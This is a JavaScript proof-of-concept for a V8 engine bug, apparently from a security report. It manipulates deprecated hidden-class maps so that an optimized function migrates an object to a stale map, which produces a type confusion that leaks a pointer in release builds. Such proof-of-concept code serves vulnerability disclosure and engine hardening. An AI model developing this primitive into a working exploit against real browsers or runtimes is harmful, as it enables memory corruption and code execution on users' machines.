// Tested on v8 built from current HEAD (dd84c3937058b086b6b7a412ac352179e20bd9c7)
// Requires --allow-natives-syntax

function assert(c) {
    if (!c) { throw "Assertion failed"; }
}

function assertFalse(c) {
    assert(!c);
}

function poc() {
    function hax(o) {
        o.c = 13.37;
    }

    function makeObjWithMap5() {
        let o = {};
        o.a = 13.37;
        o.b = {};
        return o
    }

    // Create a bunch of Maps. See the assertions for their relationships

    let m1 = {};

    let m2 = {};
    assert(%HaveSameMap(m2, m1));
    m2.a = 13.37;

    let m3 = {};
    m3.a = 13.37;
    assert(%HaveSameMap(m3, m2));
    m3.b = 1;

    let m4 = {};
    m4.a = 13.37;
    m4.b = 1;
    assert(%HaveSameMap(m4, m3));
    m4.c = {};

    let m4_2 = {};
    m4_2.a = 13.37;
    m4_2.b = 1;
    m4_2.c = {};
    assert(%HaveSameMap(m4_2, m4));

    let m5 = {};
    m5.a = 13.37;
    assert(%HaveSameMap(m5, m2));
    m5.b = 13.37;
    assertFalse(%HaveSameMap(m5, m3));

    // At this point, Map3 and Map4 are both deprecated. Map2 transitions to Map5.
    // Map5 is the migration target for Map3. The Migration target for Map4 is a new Map
    assertFalse(%HaveSameMap(m5, m3));

    let m6 = makeObjWithMap5();
    assert(%HaveSameMap(m6, m5));
    hax(m6);

    let kaputt = makeObjWithMap5();
    assert(%HaveSameMap(kaputt, m5));

    for (let i = 0; i < 100000; i++) {
        let o = i == 1337 ? makeObjWithMap5() : m6;
        hax(o);
    }

    // Map4 is deprecated, so this property access triggers a Map migration.
    // This will end up creating a new Map, Map7, to which both Map4 and Map6
    // migrate. Map5's transition entry afterwards points to Map7 and no
    // longer to Map6. Map6 is deprecated.
    let m7 = m4_2;
    assert(%HaveSameMap(m7, m4));
    m7.c;
    assertFalse(%HaveSameMap(m7, m4));

    // However, hax was not deoptimized and still transitions to Map6 because
    // Map::CanBeDeprecated returns false for it.

    // This does a in-place map generalization of Map5 and Map7, but not Map6.
    // Map6 still indicates that .a should be a double field.
    kaputt.a = "asdf";
    assert(%HaveSameMap(kaputt, m5));

    // This now migrates to the wrong map (Map6) because hax was not deoptimized.
    // This is incorrect because .a now stores a HeapObject and not a double.
    hax(kaputt);

    // This now fails in debug builds
    %HeapObjectVerify(kaputt);

    // This prints (presumably) an address in release builds
    console.log(kaputt.a);
}
%NeverOptimizeFunction(poc);

poc();
